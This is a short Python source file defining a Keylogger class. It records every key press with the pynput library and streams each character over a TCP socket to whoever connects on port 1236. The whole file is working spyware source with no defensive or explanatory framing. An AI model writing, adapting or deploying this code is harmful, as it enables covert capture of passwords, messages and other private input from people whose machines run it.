from pynput import keyboard

import socket

class Keylogger:
    def __init__(self):
        self.key = None
        self.listener = None
        self.port = 1236
        self.host = "0.0.0.0"
        self.server_socket = None
        self.conn = None
        self.address = None
    
    def start(self):
        # get instance
        self.server_socket = socket.socket()

        # bind host address and port together
        self.server_socket.bind((self.host, self.port))

        # configure how many clients the server can listen to simultaneously
        self.server_socket.listen(1) 

        # accept new connection
        self.conn, self.address = self.server_socket.accept()

        print("Connection from: " + str(self.address))

        # create keyboard listener
        self.listener = keyboard.Listener(on_press=self.log)

        # start the keyboard listener
        self.listener.start()

        # wait for user input
        input()

    def log(self, key):
        # send char over socklet to client
        self.conn.send(str(key.char).encode())

    # remove listeners and close connection
    def stop(self):
        self.listener.stop()
        self.listener = None
        self.conn.close()